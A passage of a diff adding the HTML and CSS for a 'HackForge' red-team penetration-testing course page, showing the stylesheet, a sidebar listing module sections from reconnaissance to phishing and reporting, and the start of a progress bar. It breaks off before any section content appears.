@@ -1,0 +1,1730 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>HackForge | Red Team — Penetration Testing</title>
+<link rel="icon" href="logo.png" type="image/png">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;900&family=JetBrains+Mono:wght@400;500;600&family=DM+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<style>
+/* ─── VARIABLES ─────────────────────────────────── */
+:root {
+  --bg:#000; --bg-panel:#0e0808; --panel:#160c0c; --panel-light:#1c1010;
+  --border:rgba(255,60,60,0.18); --border-dim:rgba(255,60,60,0.07);
+  --text:#f0e0e0; --muted:#8a7070;
+  --accent:#ff3c3c;
+  --accent-glow:rgba(255,60,60,0.22); --accent-dim:rgba(255,60,60,0.08);
+  --accent2:#c4ff00;
+  --danger:#ff4d4d; --warning:#f59e0b; --cyan:#00e5ff;
+  --cyan-dim:rgba(0,229,255,0.1); --purple:#8b5cf6; --green:#22c55e;
+  --sidebar-w:270px;
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+html{scroll-behavior:smooth;}
+body{font-family:'DM Sans',sans-serif;background:var(--bg);color:var(--text);overflow-x:hidden;line-height:1.75;}
+
+/* BG */
+.bg-grid{position:fixed;inset:0;background-image:linear-gradient(rgba(255,60,60,0.022) 1px,transparent 1px),linear-gradient(90deg,rgba(255,60,60,0.022) 1px,transparent 1px);background-size:48px 48px;pointer-events:none;z-index:0;animation:gridDrift 24s linear infinite;}
+@keyframes gridDrift{from{transform:translate(0,0)}to{transform:translate(48px,48px)}}
+.bg-vignette{position:fixed;inset:0;background:radial-gradient(ellipse at 20% 10%,rgba(255,60,60,0.06) 0%,transparent 55%),radial-gradient(ellipse at 80% 90%,rgba(255,100,0,0.03) 0%,transparent 55%);pointer-events:none;z-index:0;}
+
+/* SIDEBAR */
+.sidebar{position:fixed;left:0;top:0;width:var(--sidebar-w);height:100vh;background:linear-gradient(180deg,#0a0202,#000);border-right:1px solid var(--border);z-index:200;display:flex;flex-direction:column;overflow:hidden;box-shadow:4px 0 32px rgba(255,60,60,0.07);}
+.logo-wrap{padding:18px 16px 16px;border-bottom:1px solid var(--border-dim);background:linear-gradient(180deg,rgba(255,60,60,0.06),transparent);text-align:center;}
+.logo-img{width:160px;height:auto;filter:drop-shadow(0 0 18px rgba(255,60,60,0.5));display:block;margin:0 auto;transition:filter .3s,transform .3s;}
+.logo-img:hover{filter:drop-shadow(0 0 30px rgba(255,60,60,0.8));transform:scale(1.04);}
+.logo-sub{font-size:.65rem;color:var(--muted);letter-spacing:2px;text-transform:uppercase;margin-top:8px;font-family:'JetBrains Mono',monospace;}
+.lab-progress-box{margin:12px 12px 0;background:rgba(255,60,60,0.05);border:1px solid rgba(255,60,60,0.12);border-radius:10px;padding:12px 14px;}
+.lpb-label{font-family:'JetBrains Mono',monospace;font-size:.62rem;letter-spacing:1.5px;color:var(--muted);text-transform:uppercase;margin-bottom:8px;}
+.lpb-bar-track{height:5px;background:rgba(255,255,255,.04);border-radius:3px;overflow:hidden;}
+.lpb-bar-fill{height:100%;background:linear-gradient(90deg,var(--accent),#ff8000);border-radius:3px;width:0%;transition:width .8s ease;box-shadow:0 0 8px rgba(255,60,60,.5);}
+.lpb-pct{font-family:'Orbitron',sans-serif;font-size:.85rem;color:var(--accent);margin-top:5px;text-align:right;}
+.toc-label{padding:14px 22px 7px;font-family:'Orbitron',sans-serif;font-size:.58rem;letter-spacing:2.5px;text-transform:uppercase;color:var(--accent);opacity:.6;}
+.toc-scroll{flex:1;overflow-y:auto;padding:0 12px 12px;scrollbar-width:thin;scrollbar-color:rgba(255,60,60,.3) transparent;}
+.toc-scroll::-webkit-scrollbar{width:4px;}.toc-scroll::-webkit-scrollbar-thumb{background:rgba(255,60,60,.25);border-radius:2px;}
+.toc-link{display:flex;align-items:center;gap:10px;padding:8px 12px;margin:2px 0;border-radius:7px;color:var(--muted);text-decoration:none;font-size:.79rem;font-weight:500;transition:all .22s;border-left:2px solid transparent;line-height:1.3;}
+.toc-link .tn{font-family:'JetBrains Mono',monospace;font-size:.63rem;color:rgba(255,60,60,.4);flex-shrink:0;width:20px;}
+.toc-link:hover{background:var(--accent-dim);color:var(--accent);border-left-color:var(--accent);transform:translateX(3px);}
+.toc-link.active{background:rgba(255,60,60,.12);color:var(--accent);border-left-color:var(--accent);}
+.sidebar-nav{padding:10px 12px;border-top:1px solid var(--border-dim);display:flex;flex-direction:column;gap:3px;}
+.sidebar-nav a{display:flex;align-items:center;gap:8px;padding:7px 12px;border-radius:7px;color:var(--muted);text-decoration:none;font-size:.8rem;font-weight:500;transition:all .2s;}
+.sidebar-nav a:hover{background:var(--accent-dim);color:var(--accent);}
+
+/* MAIN */
+.main{margin-left:var(--sidebar-w);min-height:100vh;position:relative;z-index:1;}
+.read-indicator{position:fixed;top:0;left:var(--sidebar-w);right:0;height:2px;background:linear-gradient(90deg,var(--accent),#ff8000);transform-origin:left;transform:scaleX(0);z-index:300;transition:transform .1s;}
+
+/* TOPBAR */
+.topbar{position:sticky;top:0;z-index:100;background:rgba(0,0,0,.9);backdrop-filter:blur(18px);border-bottom:1px solid var(--border);padding:12px 48px;display:flex;align-items:center;justify-content:space-between;gap:16px;}
+.topbar-left{display:flex;align-items:center;gap:14px;}
+.breadcrumb{font-family:'JetBrains Mono',monospace;font-size:.78rem;color:var(--muted);display:flex;align-items:center;gap:6px;}
+.breadcrumb span{color:var(--accent);opacity:.7;}.breadcrumb strong{color:var(--text);}
+.difficulty-badge{padding:4px 12px;border-radius:5px;font-family:'JetBrains Mono',monospace;font-size:.7rem;font-weight:700;letter-spacing:.5px;text-transform:uppercase;background:rgba(255,60,60,.1);border:1px solid rgba(255,60,60,.25);color:var(--accent);}
+.topbar-right{display:flex;align-items:center;gap:12px;}
+.progress-pill{display:flex;align-items:center;gap:8px;background:var(--panel);border:1px solid var(--border-dim);border-radius:30px;padding:6px 14px;font-size:.78rem;color:var(--muted);}
+.progress-pill-bar{width:80px;height:5px;background:rgba(255,255,255,.05);border-radius:3px;overflow:hidden;}
+.progress-pill-fill{height:100%;background:linear-gradient(90deg,var(--accent),#ff8000);border-radius:3px;width:0%;box-shadow:0 0 8px rgba(255,60,60,.5);transition:width 1s ease;}
+.mark-btn{background:linear-gradient(135deg,var(--accent),#ff6000);color:#fff;border:none;padding:9px 18px;border-radius:7px;font-weight:700;font-size:.8rem;cursor:pointer;font-family:'Orbitron',sans-serif;transition:all .25s;box-shadow:0 0 16px rgba(255,60,60,.3);letter-spacing:.3px;}
+.mark-btn:hover{transform:translateY(-2px);box-shadow:0 4px 24px rgba(255,60,60,.5);}
+.mark-btn.done{background:linear-gradient(135deg,#22c55e,#16a34a);color:#fff;box-shadow:0 0 16px rgba(34,197,94,.3);}
+
+/* CONTENT */
+.content{padding:40px 52px 80px;max-width:980px;}
+
+/* HERO */
+.page-hero{margin-bottom:36px;padding:40px 48px;background:linear-gradient(135deg,rgba(255,60,60,0.07),rgba(255,100,0,0.04));border:1px solid var(--border);border-radius:16px;position:relative;overflow:hidden;}
+.page-hero::before{content:'⚔️';position:absolute;right:36px;top:50%;transform:translateY(-50%);font-size:8rem;opacity:.05;pointer-events:none;}
+.hero-tag{display:inline-flex;align-items:center;gap:7px;background:rgba(255,60,60,.08);border:1px solid rgba(255,60,60,.2);color:var(--accent);padding:4px 12px;border-radius:5px;font-size:.72rem;font-family:'JetBrains Mono',monospace;letter-spacing:1px;text-transform:uppercase;margin-bottom:14px;}
+.page-hero h1{font-family:'Orbitron',sans-serif;font-size:2rem;font-weight:700;background:linear-gradient(135deg,#fff 30%,var(--accent));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;margin-bottom:10px;line-height:1.2;}
+.page-hero p{color:var(--muted);font-size:.93rem;max-width:660px;line-height:1.7;}
+.hero-meta{display:flex;gap:14px;margin-top:18px;flex-wrap:wrap;}
+.hm-chip{display:flex;align-items:center;gap:6px;font-family:'JetBrains Mono',monospace;font-size:.72rem;color:var(--muted);background:var(--panel);border:1px solid var(--border-dim);padding:5px 12px;border-radius:6px;}
+.hm-chip .dot{width:6px;height:6px;border-radius:50%;}
+
+/* SECTION CARDS */
+.lab-section{background:var(--bg-panel);border:1px solid var(--border-dim);border-radius:14px;padding:32px 36px;margin-bottom:20px;position:relative;transition:border-color .3s;animation:fadeUp .4s ease both;}
+.lab-section:hover{border-color:rgba(255,60,60,.2);}
+.lab-section::before{content:'';position:absolute;top:0;left:0;width:3px;height:100%;background:linear-gradient(180deg,var(--accent),transparent);border-radius:14px 0 0 14px;opacity:0;transition:opacity .3s;}
+.lab-section:hover::before{opacity:1;}
+@keyframes fadeUp{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:translateY(0)}}
+.lab-section:nth-child(1){animation-delay:.05s}.lab-section:nth-child(2){animation-delay:.1s}
+.lab-section:nth-child(3){animation-delay:.15s}.lab-section:nth-child(4){animation-delay:.2s}
+.lab-section:nth-child(5){animation-delay:.25s}.lab-section:nth-child(6){animation-delay:.3s}
+.s-head{display:flex;align-items:center;gap:14px;margin-bottom:20px;padding-bottom:14px;border-bottom:1px solid var(--border-dim);}
+.s-num{font-family:'JetBrains Mono',monospace;font-size:.7rem;color:var(--accent);opacity:.55;flex-shrink:0;}
+.lab-section h2{font-family:'Orbitron',sans-serif;font-size:1rem;font-weight:600;color:#fff;letter-spacing:.5px;}
+.s-badge{margin-left:auto;padding:3px 9px;border-radius:5px;font-size:.66rem;font-family:'JetBrains Mono',monospace;text-transform:uppercase;letter-spacing:.5px;white-space:nowrap;}
+.sb-red{background:rgba(255,60,60,.1);border:1px solid rgba(255,60,60,.25);color:var(--accent);}
+.sb-warn{background:rgba(245,158,11,.1);border:1px solid rgba(245,158,11,.25);color:var(--warning);}
+.sb-green{background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.2);color:var(--green);}
+.sb-purple{background:rgba(139,92,246,.1);border:1px solid rgba(139,92,246,.25);color:var(--purple);}
+.sb-cyan{background:rgba(0,229,255,.08);border:1px solid rgba(0,229,255,.2);color:var(--cyan);}
+.sb-lime{background:rgba(196,255,0,.07);border:1px solid rgba(196,255,0,.18);color:var(--accent2);}
+
+/* TEXT */
+.lab-section p{color:var(--muted);font-size:.9rem;margin-bottom:12px;line-height:1.8;}
+.lab-section h3{font-size:.98rem;font-weight:600;color:var(--text);margin:20px 0 8px;display:flex;align-items:center;gap:8px;}
+.lab-section h3::before{content:'';width:14px;height:2px;background:var(--accent);border-radius:1px;flex-shrink:0;}
+.lab-section h4{font-size:.85rem;font-weight:600;color:var(--accent);margin:16px 0 6px;font-family:'JetBrains Mono',monospace;letter-spacing:.3px;}
+.lab-section ul,.lab-section ol{margin:8px 0 12px 20px;color:var(--muted);font-size:.88rem;}
+.lab-section li{margin:5px 0;padding-left:4px;line-height:1.65;}
+.lab-section li strong{color:var(--text);}
+.topic-title{font-size:1rem;font-weight:600;margin:24px 0 10px;color:var(--accent);display:flex;align-items:center;gap:10px;}
+.topic-title::before{content:'';width:4px;height:18px;background:var(--accent);border-radius:2px;flex-shrink:0;}
+
+/* BOXES */
+.info-box{background:rgba(255,60,60,0.05);border-left:3px solid var(--accent);padding:14px 18px;margin:14px 0;border-radius:8px;color:var(--muted);font-size:.88rem;line-height:1.65;}
+.info-box strong{color:var(--text);}
+.warning-box{background:rgba(245,158,11,.06);border-left:3px solid var(--warning);padding:14px 18px;margin:14px 0;border-radius:8px;color:var(--muted);font-size:.88rem;line-height:1.65;}
+.warning-box strong{color:var(--text);}
+.note-box{background:rgba(139,92,246,.06);border-left:3px solid var(--purple);padding:14px 18px;margin:14px 0;border-radius:8px;color:var(--muted);font-size:.88rem;line-height:1.65;}
+.note-box strong{color:var(--text);}
+.success-box{background:rgba(34,197,94,.05);border-left:3px solid var(--green);padding:14px 18px;margin:14px 0;border-radius:8px;color:var(--muted);font-size:.88rem;line-height:1.65;}
+.success-box strong{color:var(--text);}
+.danger-box{background:rgba(255,60,60,.06);border-left:3px solid var(--danger);padding:14px 18px;margin:14px 0;border-radius:8px;color:var(--muted);font-size:.88rem;line-height:1.65;}
+.danger-box strong{color:var(--text);}
+
+/* DIAGRAM */
+.diagram-container{background:#080202;border:1px solid var(--border-dim);border-radius:12px;padding:24px;margin:18px 0;}
+.diagram-title{font-family:'JetBrains Mono',monospace;font-size:.7rem;letter-spacing:1.5px;text-transform:uppercase;color:var(--muted);margin-bottom:16px;}
+
+/* TABLE */
+.lab-section table{width:100%;border-collapse:collapse;margin:14px 0;font-size:.87rem;}
+.lab-section thead tr{background:rgba(255,60,60,.07);border-bottom:1px solid var(--border);}
+.lab-section th{padding:11px 14px;text-align:left;font-family:'Orbitron',sans-serif;font-size:.63rem;font-weight:600;color:var(--accent);letter-spacing:.8px;text-transform:uppercase;}
+.lab-section td{padding:10px 14px;border-bottom:1px solid var(--border-dim);color:var(--muted);vertical-align:top;}
+.lab-section td:first-child{color:var(--text);font-weight:500;}
+.lab-section tr:hover td{background:rgba(255,60,60,.03);}
+
+/* CODE */
+code{font-family:'JetBrains Mono',monospace;background:rgba(255,60,60,.08);border:1px solid rgba(255,60,60,.15);color:var(--accent);padding:2px 7px;border-radius:4px;font-size:.82em;}
+pre{background:#060101;border:1px solid var(--border-dim);border-radius:10px;padding:18px 20px;overflow-x:auto;font-family:'JetBrains Mono',monospace;font-size:.83rem;color:#d4a0a0;margin:14px 0;line-height:1.7;}
+pre .c{color:#4a3030;} pre .k{color:var(--accent);} pre .s{color:var(--warning);}
+pre .g{color:var(--green);}
+
+/* PHASE CARDS */
+.phase-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:12px;margin:20px 0;}
+.phase-card{border-radius:10px;padding:16px 12px;text-align:center;position:relative;overflow:hidden;transition:transform .25s,box-shadow .25s;cursor:default;}
+.phase-card:hover{transform:translateY(-4px);}
+.phase-card .pc-icon{font-size:1.8rem;margin-bottom:6px;}
+.phase-card .pc-num{font-family:'Orbitron',sans-serif;font-size:.6rem;letter-spacing:1px;text-transform:uppercase;margin-bottom:4px;opacity:.5;}
+.phase-card .pc-name{font-family:'Orbitron',sans-serif;font-size:.72rem;font-weight:700;margin-bottom:6px;}
+.phase-card p{font-size:.74rem;color:var(--muted);line-height:1.5;margin:0;}
+.ph-1{background:rgba(139,92,246,.07);border:1px solid rgba(139,92,246,.18);}.ph-1 .pc-name{color:var(--purple);}
+.ph-2{background:rgba(255,60,60,.07);border:1px solid rgba(255,60,60,.2);}.ph-2 .pc-name{color:var(--accent);}
+.ph-3{background:rgba(245,158,11,.07);border:1px solid rgba(245,158,11,.18);}.ph-3 .pc-name{color:var(--warning);}
+.ph-4{background:rgba(255,60,60,.1);border:1px solid rgba(255,60,60,.28);}.ph-4 .pc-name{color:#ff6060;}
+.ph-5{background:rgba(0,229,255,.06);border:1px solid rgba(0,229,255,.18);}.ph-5 .pc-name{color:var(--cyan);}
+.ph-6{background:rgba(34,197,94,.07);border:1px solid rgba(34,197,94,.18);}.ph-6 .pc-name{color:var(--green);}
+.ph-7{background:rgba(196,255,0,.06);border:1px solid rgba(196,255,0,.15);}.ph-7 .pc-name{color:var(--accent2);}
+
+/* TOOL CARDS */
+.tool-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:12px;margin:16px 0;}
+.tool-card{background:var(--panel);border:1px solid var(--border-dim);border-radius:10px;padding:16px;transition:all .25s;}
+.tool-card:hover{border-color:rgba(255,60,60,.25);transform:translateY(-3px);box-shadow:0 6px 20px rgba(0,0,0,.4);}
+.tc-name{font-family:'Orbitron',sans-serif;font-size:.78rem;font-weight:700;color:var(--accent);margin-bottom:6px;display:flex;align-items:center;gap:8px;}
+.tc-desc{font-size:.8rem;color:var(--muted);line-height:1.55;margin-bottom:8px;}
+.tc-tag{display:inline-block;font-size:.63rem;font-family:'JetBrains Mono',monospace;padding:2px 7px;border-radius:4px;background:rgba(255,60,60,.07);border:1px solid rgba(255,60,60,.15);color:var(--muted);}
+
+/* FLOW STEPS */
+.flow-steps{display:flex;flex-direction:column;gap:10px;margin:16px 0;}
+.flow-step{display:flex;align-items:flex-start;gap:16px;background:var(--panel);border:1px solid var(--border-dim);border-radius:10px;padding:14px 18px;transition:border-color .3s;}
+.flow-step:hover{border-color:rgba(255,60,60,.2);}
+.fs-num{font-family:'Orbitron',sans-serif;font-size:1.1rem;font-weight:900;color:var(--accent);opacity:.55;flex-shrink:0;width:28px;}
+.fs-body h4{font-size:.88rem;font-weight:600;color:var(--text);margin-bottom:4px;}
+.fs-body p{font-size:.82rem;color:var(--muted);line-height:1.6;margin:0;}
+
+/* PRIVESC TABS */
+.tab-row{display:flex;gap:8px;margin-bottom:0;border-bottom:1px solid var(--border-dim);}
+.tab-btn{background:none;border:none;padding:10px 18px;font-size:.82rem;font-family:'JetBrains Mono',monospace;color:var(--muted);cursor:pointer;border-bottom:2px solid transparent;transition:all .2s;margin-bottom:-1px;}
+.tab-btn.active{color:var(--accent);border-bottom-color:var(--accent);}
+.tab-btn:hover{color:var(--accent);}
+.tab-pane{display:none;padding:18px 0;}
+.tab-pane.active{display:block;}
+
+/* RECON SIMULATOR */
+.recon-sim{background:#060101;border:1px solid var(--border-dim);border-radius:12px;overflow:hidden;margin:18px 0;}
+.recon-hdr{background:rgba(255,60,60,.06);border-bottom:1px solid var(--border-dim);padding:11px 16px;display:flex;align-items:center;gap:10px;}
+.recon-hdr span{font-family:'JetBrains Mono',monospace;font-size:.72rem;color:var(--muted);letter-spacing:1px;text-transform:uppercase;}
+.r-dot{width:8px;height:8px;border-radius:50%;background:var(--accent);box-shadow:0 0 6px var(--accent);animation:pulse 2s ease infinite;}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
+.recon-input-row{display:flex;gap:8px;padding:14px 16px;border-bottom:1px solid var(--border-dim);}
+.recon-input{flex:1;background:rgba(255,255,255,.04);border:1px solid var(--border-dim);color:var(--text);padding:9px 14px;border-radius:7px;font-family:'JetBrains Mono',monospace;font-size:.82rem;outline:none;transition:border-color .2s;}
+.recon-input:focus{border-color:rgba(255,60,60,.4);}
+.recon-select{background:rgba(255,255,255,.04);border:1px solid var(--border-dim);color:var(--muted);padding:9px 12px;border-radius:7px;font-family:'JetBrains Mono',monospace;font-size:.78rem;cursor:pointer;outline:none;}
+.recon-select option{background:#160c0c;}
+.recon-run{background:linear-gradient(135deg,var(--accent),#ff6000);color:#fff;border:none;padding:9px 20px;border-radius:7px;font-family:'Orbitron',monospace;font-size:.75rem;font-weight:700;cursor:pointer;transition:all .2s;white-space:nowrap;}
+.recon-run:hover{transform:translateY(-1px);box-shadow:0 4px 16px rgba(255,60,60,.4);}
+.recon-output{padding:16px;font-family:'JetBrains Mono',monospace;font-size:.78rem;line-height:2;min-height:120px;}
+.ro-line{display:block;animation:roIn .25s ease both;}
+@keyframes roIn{from{opacity:0;transform:translateX(-6px)}to{opacity:1;transform:translateX(0)}}
+.ro-cmd{color:var(--accent);}
+.ro-ok{color:var(--green);}
+.ro-warn{color:var(--warning);}
+.ro-info{color:var(--muted);}
+.ro-vuln{color:#ff8080;}
+.ro-dim{color:#4a3030;}
+
+/* EXPLOIT QUIZ */
+.exploit-quiz{background:var(--panel);border:1px solid var(--border-dim);border-radius:12px;padding:22px;margin:18px 0;}
+.eq-title{font-family:'Orbitron',sans-serif;font-size:.82rem;font-weight:700;color:var(--accent);margin-bottom:14px;display:flex;align-items:center;gap:10px;}
+.eq-score{margin-left:auto;font-size:.72rem;font-family:'JetBrains Mono',monospace;color:var(--muted);}
+.eq-q{font-size:.88rem;color:var(--text);margin-bottom:12px;line-height:1.65;font-weight:500;}
+.eq-opts{display:flex;flex-direction:column;gap:7px;}
+.eq-opt{background:var(--bg-panel);border:1px solid var(--border-dim);border-radius:8px;padding:10px 14px;font-size:.83rem;color:var(--muted);cursor:pointer;transition:all .2s;display:flex;align-items:center;gap:10px;}
+.eq-opt:hover{border-color:rgba(255,60,60,.3);color:var(--accent);}
+.eq-opt.correct{border-color:var(--green);background:rgba(34,197,94,.08);color:var(--green);}
+.eq-opt.wrong{border-color:var(--danger);background:rgba(255,60,60,.08);color:var(--danger);}
+.eq-exp{margin-top:12px;padding:10px 14px;border-radius:8px;font-size:.82rem;color:var(--muted);background:rgba(255,60,60,.05);border:1px solid var(--border-dim);display:none;}
+.eq-next{margin-top:12px;background:var(--accent-dim);border:1px solid var(--border);color:var(--accent);padding:8px 18px;border-radius:7px;font-size:.78rem;font-family:'JetBrains Mono',monospace;cursor:pointer;display:none;}
+
+/* METHODOLOGY TIMELINE */
+.method-timeline{position:relative;padding:0 0 0 32px;margin:20px 0;}
+.method-timeline::before{content:'';position:absolute;left:10px;top:0;bottom:0;width:2px;background:linear-gradient(180deg,var(--accent),rgba(255,60,60,.1));}
+.mt-item{position:relative;margin-bottom:20px;}
+.mt-item::before{content:'';position:absolute;left:-26px;top:14px;width:12px;height:12px;border-radius:50%;background:var(--accent);box-shadow:0 0 10px rgba(255,60,60,.5);border:2px solid var(--bg);}
+.mt-card{background:var(--panel);border:1px solid var(--border-dim);border-radius:10px;padding:16px 18px;transition:border-color .3s;}
+.mt-card:hover{border-color:rgba(255,60,60,.25);}
+.mt-phase{font-family:'JetBrains Mono',monospace;font-size:.65rem;letter-spacing:1px;text-transform:uppercase;color:var(--accent);opacity:.7;margin-bottom:4px;}
+.mt-title{font-size:.92rem;font-weight:600;color:var(--text);margin-bottom:6px;}
+.mt-desc{font-size:.82rem;color:var(--muted);line-height:1.6;margin-bottom:8px;}
+.mt-tools{display:flex;flex-wrap:wrap;gap:6px;}
+.mt-tool{font-size:.68rem;font-family:'JetBrains Mono',monospace;padding:2px 8px;border-radius:4px;background:rgba(255,60,60,.07);border:1px solid rgba(255,60,60,.15);color:var(--muted);}
+
+/* PRIVESC CARDS */
+.privesc-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:14px;margin:16px 0;}
+.privesc-card{background:var(--panel);border:1px solid var(--border-dim);border-radius:10px;padding:18px;}
+.privesc-card h4{font-family:'Orbitron',sans-serif;font-size:.78rem;font-weight:700;margin-bottom:10px;}
+.privesc-card ul{list-style:none;margin:0;padding:0;}
+.privesc-card li{font-size:.8rem;color:var(--muted);padding:4px 0;border-bottom:1px solid rgba(255,255,255,.04);display:flex;gap:8px;}
+.privesc-card li:last-child{border-bottom:none;}
+.privesc-card li::before{content:'›';color:var(--accent);flex-shrink:0;}
+.pc-linux{border-color:rgba(34,197,94,.2);}.pc-linux h4{color:var(--green);}
+.pc-win{border-color:rgba(0,180,255,.2);}.pc-win h4{color:var(--cyan);}
+
+/* VIVA */
+.viva-section{background:var(--panel);border:2px solid rgba(255,60,60,.15);border-radius:14px;padding:28px 32px;margin-top:30px;position:relative;overflow:hidden;}
+.viva-section::before{content:'';position:absolute;inset:0;background:radial-gradient(ellipse at 50% 0%,rgba(255,60,60,0.05),transparent 70%);pointer-events:none;}
+.viva-locked-overlay{text-align:center;padding:32px 20px;}
+.lock-icon{font-size:2.8rem;margin-bottom:12px;}
+.lock-msg{font-family:'JetBrains Mono',monospace;font-size:.8rem;color:var(--muted);line-height:1.7;}
+.viva-timer{font-family:'Orbitron',sans-serif;font-size:2.2rem;font-weight:700;color:var(--accent);text-align:center;margin:10px 0 20px;letter-spacing:3px;text-shadow:0 0 20px rgba(255,60,60,.5);}
+.quiz-q{background:var(--bg-panel);border:1px solid var(--border-dim);border-radius:10px;padding:16px 18px;margin-bottom:12px;}
+.quiz-q p{font-size:.9rem;color:var(--text);margin-bottom:12px;font-weight:500;}
+.quiz-q label{display:flex;align-items:center;gap:10px;padding:8px 12px;border-radius:7px;color:var(--muted);font-size:.85rem;cursor:pointer;transition:background .2s;}
+.quiz-q label:hover{background:rgba(255,60,60,.06);}
+.quiz-q input[type=radio]{accent-color:var(--accent);width:15px;height:15px;flex-shrink:0;}
+.submit-quiz{background:linear-gradient(135deg,var(--accent),#ff6000);color:#fff;border:none;padding:12px 32px;border-radius:9px;font-weight:700;font-size:.88rem;cursor:pointer;font-family:'Orbitron',sans-serif;letter-spacing:.4px;margin-top:12px;transition:all .3s;box-shadow:0 0 20px rgba(255,60,60,.25);}
+.submit-quiz:hover{transform:translateY(-2px);box-shadow:0 4px 28px rgba(255,60,60,.45);}
+.quiz-result{margin-top:16px;padding:18px 22px;border-radius:10px;text-align:center;display:none;}
+.qr-pass{background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.25);}
+.qr-fail{background:rgba(255,60,60,.08);border:1px solid rgba(255,60,60,.25);}
+.qr-score{font-family:'Orbitron',sans-serif;font-size:2.5rem;font-weight:900;margin-bottom:8px;}
+.qr-msg{font-size:.88rem;color:var(--muted);}
+
+/* COMPLETE */
+.complete-wrap{text-align:center;padding:40px 0 20px;}
+.complete-btn{background:linear-gradient(135deg,var(--accent),#ff6000);color:#fff;border:none;padding:14px 36px;border-radius:10px;font-weight:700;font-size:.92rem;cursor:pointer;font-family:'Orbitron',sans-serif;letter-spacing:.5px;transition:all .3s;box-shadow:0 0 24px rgba(255,60,60,.3);}
+.complete-btn:hover{transform:translateY(-3px);box-shadow:0 6px 32px rgba(255,60,60,.5);}
+.complete-btn.done{background:linear-gradient(135deg,#22c55e,#16a34a);}
+
+/* REF CARD */
+.ref-card{display:flex;align-items:center;gap:16px;padding:16px 20px;background:var(--bg-panel);border:1px solid var(--border);border-radius:12px;margin-bottom:12px;transition:all .25s;text-decoration:none;}
+.ref-card:hover{transform:translateX(5px);box-shadow:0 4px 20px rgba(0,0,0,.4);border-color:rgba(255,60,60,.3);}
+.ref-icon{font-size:1.8rem;} .ref-body{flex:1;}
+.ref-name{font-weight:600;color:var(--text);font-size:.93rem;margin-bottom:3px;}
+.ref-sub{font-size:.79rem;color:var(--muted);}
+.ref-arrow{color:var(--accent);font-size:1.2rem;}
+
+/* FOOTER */
+footer{text-align:center;padding:24px 52px;border-top:1px solid var(--border-dim);font-size:.8rem;color:var(--muted);font-family:'JetBrains Mono',monospace;letter-spacing:.5px;}
+footer a{color:var(--accent);text-decoration:none;}
+
+/* MOBILE */
+@media(max-width:860px){
+  :root{--sidebar-w:0px;}.sidebar{display:none;}
+  .content{padding:24px 20px 60px;}.topbar{padding:12px 20px;}
+  .page-hero{padding:24px 20px;}.page-hero h1{font-size:1.5rem;}
+  .lab-section{padding:20px 16px;}
+  .phase-grid{grid-template-columns:repeat(2,1fr);}
+  .tool-grid{grid-template-columns:1fr;}
+  .privesc-grid{grid-template-columns:1fr;}
+}
+</style>
+</head>
+<body>
+<div class="bg-grid"></div>
+<div class="bg-vignette"></div>
+<div class="read-indicator" id="readIndicator"></div>
+
+<!-- ══════════ SIDEBAR ══════════ -->
+<aside class="sidebar">
+  <div class="logo-wrap">
+    <img src="logo.png" alt="HackForge" class="logo-img">
+    <div class="logo-sub">Red Team Module</div>
+  </div>
+  <div class="lab-progress-box">
+    <div class="lpb-label">Progress</div>
+    <div class="lpb-bar-track"><div class="lpb-bar-fill" id="lpbFill"></div></div>
+    <div class="lpb-pct" id="lpbPct">0%</div>
+  </div>
+  <div class="toc-label">Sections</div>
+  <div class="toc-scroll">
+    <a class="toc-link" href="#s1"><span class="tn">01</span>What is Red Team?</a>
+    <a class="toc-link" href="#s2"><span class="tn">02</span>Ethics &amp; Legal</a>
+    <a class="toc-link" href="#s3"><span class="tn">03</span>Pentesting Methodology</a>
+    <a class="toc-link" href="#s4"><span class="tn">04</span>🧪 Recon Simulator</a>
+    <a class="toc-link" href="#s5"><span class="tn">05</span>Enumeration</a>
+    <a class="toc-link" href="#s6"><span class="tn">06</span>Vulnerability Analysis</a>
+    <a class="toc-link" href="#s7"><span class="tn">07</span>Exploitation</a>
+    <a class="toc-link" href="#s8"><span class="tn">08</span>🧪 Exploit Scenario Lab</a>
+    <a class="toc-link" href="#s9"><span class="tn">09</span>Privilege Escalation</a>
+    <a class="toc-link" href="#s10"><span class="tn">10</span>Post-Exploitation</a>
+    <a class="toc-link" href="#s11"><span class="tn">11</span>Lateral Movement</a>
+    <a class="toc-link" href="#s12"><span class="tn">12</span>C2 Frameworks</a>
+    <a class="toc-link" href="#s13"><span class="tn">13</span>Persistence Techniques</a>
+    <a class="toc-link" href="#s14"><span class="tn">14</span>Defense Evasion</a>
+    <a class="toc-link" href="#s15"><span class="tn">15</span>Social Engineering</a>
+    <a class="toc-link" href="#s16"><span class="tn">16</span>🧪 Phishing Lab</a>
+    <a class="toc-link" href="#s17"><span class="tn">17</span>Web App Pentesting</a>
+    <a class="toc-link" href="#s18"><span class="tn">18</span>Red Team Tools</a>
+    <a class="toc-link" href="#s19"><span class="tn">19</span>Pentest Reporting</a>
+    <a class="toc-link" href="#s20"><span class="tn">20</span>Career Path</a>
+    <a class="toc-link" href="#s21"><span class="tn">📝</span>🎓 Final Viva</a>
+  </div>
+  <div class="sidebar-nav">
+    <a href="index.html">🏠 Home</a>
+    <a href="blue-team.html">🛡️ Blue Team</a>
+    <a href="roadmap.html">🗺️ Roadmap</a>
+    <a href="practice-lab.html">⚗️ Labs</a>
+  </div>
+</aside>
+
+<!-- ══════════ MAIN ══════════ -->
+<main class="main">
+  <div class="topbar">
+    <div class="topbar-left">
+      <div class="breadcrumb"><span>HackForge</span> / <span>Red Team</span> / <strong>Penetration Testing</strong></div>
+      <div class="difficulty-badge">MODULE 07</div>
+    </div>
+    <div class="topbar-right">
+      <div class="progress-pill">
+        <span>Progress</span>
+        <div class="progress-pill-bar"><div class="progress-pill-fill" id="pillFill"></div></div>
+        <span id="pillPct">0%</span>
